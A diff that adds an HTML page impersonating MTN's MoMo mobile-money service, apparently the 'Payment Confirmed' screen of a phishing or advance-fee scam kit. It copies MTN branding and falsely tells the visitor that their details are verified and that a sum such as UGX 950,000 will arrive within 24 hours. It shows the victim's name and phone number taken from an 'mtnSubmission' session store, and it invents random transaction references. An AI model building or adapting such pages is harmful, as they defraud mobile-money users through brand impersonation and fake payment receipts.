@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+<title>MoMo — Payment Confirmed</title>
+<style>
+:root{
+  --blue:#004F71; --dark:#003654; --pale:#CCDCE3; --yellow:#FFCC05;
+  --white:#fff; --muted:#6B7B87; --border:#DCE3E8;
+  --ok:#15803D; --okBg:#ECFDF3;
+  --warnBg:#FFFBEF; --warnBd:#F5E9B8; --warnTx:#6B5A00;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow:hidden;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;-webkit-font-smoothing:antialiased}
+body{background:#F2F5F7;display:flex;justify-content:center;align-items:center;padding:16px}
+
+.phone{
+  width:100%;max-width:420px;height:100%;max-height:740px;
+  background:var(--white);border-radius:24px;overflow:hidden;
+  box-shadow:0 24px 70px -16px rgba(0,54,84,.28),0 6px 20px rgba(0,54,84,.08);
+  display:flex;flex-direction:column;position:relative;
+}
+
+/* Header */
+.bar{background:var(--blue);padding:14px 18px;display:flex;align-items:center;justify-content:center;position:relative;flex-shrink:0}
+.bar::after{content:"";position:absolute;left:0;right:0;bottom:0;height:2px;background:var(--yellow)}
+.logo{display:flex;align-items:center;gap:8px}
+.mark{width:28px;height:28px;border-radius:6px;background:var(--yellow);display:flex;align-items:center;justify-content:center;color:var(--blue);font-weight:900;font-size:13px;box-shadow:0 2px 6px rgba(0,0,0,.15)}
+.word{display:flex;flex-direction:column;line-height:1}
+.word b{color:#fff;font-weight:800;font-size:17px;letter-spacing:-.4px}
+.word span{color:rgba(255,255,255,.75);font-size:9px;font-weight:700;letter-spacing:.9px;text-transform:uppercase;margin-top:2px}
+
+/* Body — centered, no scroll */
+.body{
+  flex:1;padding:22px;display:flex;flex-direction:column;
+  justify-content:center;gap:16px;min-height:0;
+}
+
+/* Tick */
+.tick{
+  width:70px;height:70px;margin:0 auto;border-radius:50%;
+  background:linear-gradient(135deg,var(--ok),#0F7A32);
+  display:flex;align-items:center;justify-content:center;position:relative;
+  box-shadow:0 12px 30px -8px rgba(21,128,61,.45);
+  animation:pop .5s cubic-bezier(.68,-.55,.265,1.55);
+  flex-shrink:0;
+}
+@keyframes pop{0%{transform:scale(0)}100%{transform:scale(1)}}
+.tick::before,.tick::after{
+  content:"";position:absolute;inset:0;border-radius:50%;
+  border:2px solid rgba(21,128,61,.3);animation:ping 2s cubic-bezier(0,0,.2,1) infinite
+}
+.tick::after{animation-delay:1s}
+@keyframes ping{0%{transform:scale(1);opacity:.7}75%,100%{transform:scale(1.6);opacity:0}}
+.tick svg{width:34px;height:34px;color:#fff;stroke-width:3.5;position:relative;z-index:1}
+
+/* Heading */
+.head{text-align:center}
+.head h1{font-size:19px;font-weight:800;color:var(--dark);letter-spacing:-.4px;line-height:1.3;margin-bottom:6px}
+.head p{font-size:12px;color:var(--muted);line-height:1.5;font-weight:500;max-width:300px;margin:0 auto}
+
+/* 24h notice */
+.notice{
+  display:flex;gap:11px;padding:12px 14px;
+  background:var(--warnBg);border:1px solid var(--warnBd);border-radius:12px;
+  flex-shrink:0;
+}
+.notice .ic{
+  width:30px;height:30px;border-radius:8px;background:var(--yellow);
+  display:flex;align-items:center;justify-content:center;
+  color:var(--dark);flex-shrink:0;
+}
+.notice .ic svg{width:15px;height:15px}
+.notice .tx{flex:1}
+.notice .tt{font-size:11.5px;font-weight:800;color:var(--dark);margin-bottom:3px;letter-spacing:-.1px}
+.notice .tb{font-size:11.5px;color:var(--warnTx);line-height:1.5;font-weight:500}
+.notice .tb b{color:var(--dark);font-weight:800}
+
+/* Receipt */
+.receipt{
+  background:#F7FAFC;border:1px solid var(--border);border-radius:12px;
+  overflow:hidden;flex-shrink:0;
+}
+.receipt .rh{
+  padding:9px 14px;background:var(--pale);border-bottom:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;
+}
+.receipt .rt{
+  font-size:10.5px;font-weight:800;color:var(--dark);
+  text-transform:uppercase;letter-spacing:.7px;
+  display:flex;align-items:center;gap:6px;
+}
+.receipt .rt svg{width:12px;height:12px}
+.receipt .rs{
+  font-size:9.5px;font-weight:800;color:var(--ok);background:var(--okBg);
+  padding:3px 8px;border-radius:20px;letter-spacing:.4px;text-transform:uppercase;
+}
+.row{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:10px 14px;border-bottom:1px solid var(--border);
+  font-size:12.5px;gap:12px;
+}
+.row:last-child{border-bottom:none}
+.row .l{color:var(--muted);font-weight:500;flex-shrink:0}
+.row .v{
+  font-weight:700;color:var(--dark);text-align:right;
+  font-variant-numeric:tabular-nums;word-break:break-word;
+}
+.row .v.amount{font-size:14px;font-weight:900;color:var(--dark);letter-spacing:-.3px}
+.row .v.blue{color:var(--blue)}
+.row .v.ok{color:var(--ok)}
+
+@media(max-height:700px){
+  .body{gap:12px;padding:18px 22px}
+  .tick{width:58px;height:58px}
+  .tick svg{width:28px;height:28px}
+  .head h1{font-size:17px}
+  .row{padding:9px 14px;font-size:12px}
+  .notice{padding:10px 12px}
+}
+</style>
+</head>
+<body>
+<div class="phone">
+
+  <header class="bar">
+    <div class="logo">
+      <div class="mark">M</div>
+      <div class="word"><b>MoMo</b><span>from MTN</span></div>
+    </div>
+  </header>
+
+  <main class="body">
+
+    <div class="tick">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="20 6 9 17 4 12"/>
+      </svg>
+    </div>
+
+    <div class="head">
+      <h1>Payment Confirmed</h1>
+      <p>Your details have been verified successfully.</p>
+    </div>
+
+    <div class="notice">
+      <div class="ic">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/>
+          <polyline points="12 6 12 12 16 14"/>
+        </svg>
+      </div>
+      <div class="tx">
+        <div class="tt">Delivery within 24 hours</div>
+        <div class="tb">You will receive the amount within <b>24 hours</b> if the details entered are correct.</div>
+      </div>
+    </div>
+
+    <div class="receipt">
+      <div class="rh">
+        <div class="rt">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+          Receipt
+        </div>
+        <span class="rs">Verified</span>
+      </div>
+
+      <div class="row">
+        <span class="l">Amount</span>
+        <span class="v amount" id="amt">UGX 950,000</span>
+      </div>
+      <div class="row">
+        <span class="l">Recipient</span>
+        <span class="v" id="rcp">—</span>
+      </div>
+      <div class="row">
+        <span class="l">MoMo Number</span>
+        <span class="v" id="phn">—</span>
+      </div>
+      <div class="row">
+        <span class="l">Reference</span>
+        <span class="v blue" id="ref">—</span>
+      </div>
+      <div class="row">
+        <span class="l">Date</span>
+        <span class="v" id="dt">—</span>
+      </div>
+      <div class="row">
+        <span class="l">Status</span>
+        <span class="v ok">Confirmed</span>
+      </div>
+    </div>
+
+  </main>
+
+</div>
+
+<script>
+  const CURRENCIES = {
+    '+256': { symbol: 'UGX',  rate: 3800 },
+    '+233': { symbol: 'GHS',  rate: 15.2 },
+    '+234': { symbol: '₦',    rate: 1550 },
+    '+237': { symbol: 'FCFA', rate: 605  },
+    '+250': { symbol: 'RWF',  rate: 1380 },
+    '+260': { symbol: 'ZMW',  rate: 27   },
+    '+211': { symbol: 'SSP',  rate: 4200 },
+    '+225': { symbol: 'FCFA', rate: 605  }
+  };
+
+  function sess() {
+    try { return JSON.parse(sessionStorage.getItem('mtnSubmission') || '{}'); }
+    catch (_) { return {}; }
+  }
+
+  async function load() {
+    let usd = 250, ref = '';
+    try {
+      const r = await fetch('/api/state');
+      const s = await r.json();
+      if (s.amount != null) usd = Number(s.amount);
+      if (s.reference) ref = s.reference;
+    } catch (_) {}
+
+    const s = sess();
+    const country = s.countryCode || '+256';
+    const cur = CURRENCIES[country] || CURRENCIES['+256'];
+    const local = Math.round(usd * cur.rate);
+
+    document.getElementById('amt').textContent = `${cur.symbol} ${local.toLocaleString()}`;
+    if (s.recipientName) document.getElementById('rcp').textContent = s.recipientName;
+    if (s.phone)         document.getElementById('phn').textContent = s.phone;
+    document.getElementById('ref').textContent = ref || ('SW-' + Math.floor(1000000 + Math.random() * 9000000));
+    document.getElementById('dt').textContent =
+      new Date().toLocaleDateString(undefined, { month: 'short', day: 'numeric', year: 'numeric' });
+  }
+
+  load();
+</script>
+</body>
+</html>
